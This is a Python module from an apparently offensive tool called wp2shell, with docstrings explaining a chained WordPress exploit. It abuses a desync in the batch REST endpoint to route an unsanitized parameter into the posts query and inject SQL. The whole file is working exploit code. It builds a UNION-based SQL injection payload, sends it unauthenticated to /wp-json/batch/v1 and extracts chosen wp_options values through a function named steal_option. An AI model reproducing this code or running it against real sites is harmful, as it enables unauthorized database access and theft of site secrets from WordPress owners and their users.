"""Exploit-side HTTP helpers for wp2shell.

Builds and sends the 3-entry `/wp-json/batch/v1` payload that chains
CVE-2026-63030 (batch `$matches[]`/`$requests[]` desync in
`serve_batch_request_v1()`) into CVE-2026-60137 (unauthenticated SQLi via
`WP_Query`'s `author__not_in`).

Construction (see `_maintainer/README.md` for the full source-level
derivation):

  index 0 — path `":"`. `wp_parse_url(":")` fails (a bare colon, no leading
            `/`, so wp_parse_url's own `//`/`/`-prefix rewrite doesn't kick
            in before the native `parse_url()` call). The failure is pushed
            to `$validation[]` but NOT `$matches[]` — the array desync.
  index 1 — path `/wp/v2/widgets`, one of only two REST controllers with
            `allow_batch` enabled (posts is the other), carrying the raw
            SQLi string on a query key (`author_exclude`) the widgets
            collection schema does not declare. Because it's unrecognized by
            THIS request's own matched schema, `sanitize_params()` never
            touches it — it survives verbatim in the request's param bag.
            This is the entry that actually gets dispatched at slot 1 of the
            desynced `$matches[]` array — i.e. under index 2's handler.
  index 2 — path `/wp/v2/posts`. Never meaningfully executed as its OWN
            top-level entry (its `$matches[2]` slot is now out of range); its
            only purpose is to be the SECOND push into `$matches[]`, so that
            `$matches[1]` (what index 1 reads) is REALLY this entry's
            `[route, handler]` — the real posts collection GET
            callback + schema. Index 1's request object (still carrying its
            own unsanitized `author_exclude`) is then dispatched THROUGH that
            borrowed posts callback, reaching `WP_Query` with a raw string.

The injected `author_exclude` value closes the `NOT IN (...)` parenthesis and
UNION-selects a synthetic 23-column `wp_posts` row (the real column count/
order, confirmed against `wp-admin/includes/schema.php`) whose `post_content`
carries the target `wp_options.option_value`. The synthetic row surfaces in
index 1's response body (the posts-listing JSON, since it ran under the
posts callback) — this module looks for it there.
"""
from __future__ import annotations

import re
import uuid

import httpx

MALFORMED_PATH = ":"          # index 0 — deliberately fails wp_parse_url()
CARRIER_PATH = "/wp/v2/widgets"   # index 1 — carries the raw injection
DONOR_PATH = "/wp/v2/posts"       # index 2 — donates its handler via the desync


def _union_payload(option_name: str, marker: str) -> str:
    """23-column UNION matching wp_posts' real column list/order. post_content
    (column 5) carries the exfiltrated option_value; post_name (column 12) is
    the caller-chosen `marker` used to find this synthetic row in the
    response JSON without guessing at ID collisions."""
    sub = f"(SELECT option_value FROM wp_options WHERE option_name='{option_name}')"
    cols = [
        "1", "1", "NOW()", "NOW()", sub, "'wp2shell-exfil'", "''",
        "'publish'", "'open'", "'open'", "''", f"'{marker}'", "''", "''",
        "NOW()", "NOW()", "''", "0", "''", "0", "'post'", "''", "0",
    ]
    assert len(cols) == 23, "wp_posts has exactly 23 columns"
    return "0) UNION ALL SELECT " + ",".join(cols) + "-- -"


def build_batch_payload(option_name: str, marker: str) -> dict:
    injection = _union_payload(option_name, marker)
    return {
        "requests": [
            {"path": MALFORMED_PATH},
            {"path": CARRIER_PATH, "query": {"author_exclude": injection}},
            {"path": DONOR_PATH},
        ]
    }


def steal_option(base_url: str, option_name: str, *, timeout: float = 15.0) -> str | None:
    """Send the chained batch request and pull `option_name`'s value out of
    the synthetic UNION row. Returns None if the chain didn't yield it
    (patched box, or the reconstructed request shape needs adjustment — see
    the honesty note in `_maintainer/README.md`)."""
    marker = f"wp2shell-exfil-{uuid.uuid4().hex[:12]}"
    payload = build_batch_payload(option_name, marker)
    with httpx.Client(timeout=timeout) as c:
        r = c.post(f"{base_url}/wp-json/batch/v1", json=payload)
        r.raise_for_status()
        body_text = r.text

    # Don't assume an exact JSON shape for the borrowed-callback response —
    # just anchor on our own marker and pull the content field near it.
    idx = body_text.find(marker)
    if idx == -1:
        return None
    window = body_text[max(0, idx - 4000):idx]
    m = re.search(r'"post_content"\s*:\s*"((?:[^"\\]|\\.)*)"', window)
    if not m:
        m = re.search(r'"rendered"\s*:\s*"((?:[^"\\]|\\.)*)"', window)
    if not m:
        return None
    return m.group(1).encode().decode("unicode_escape")
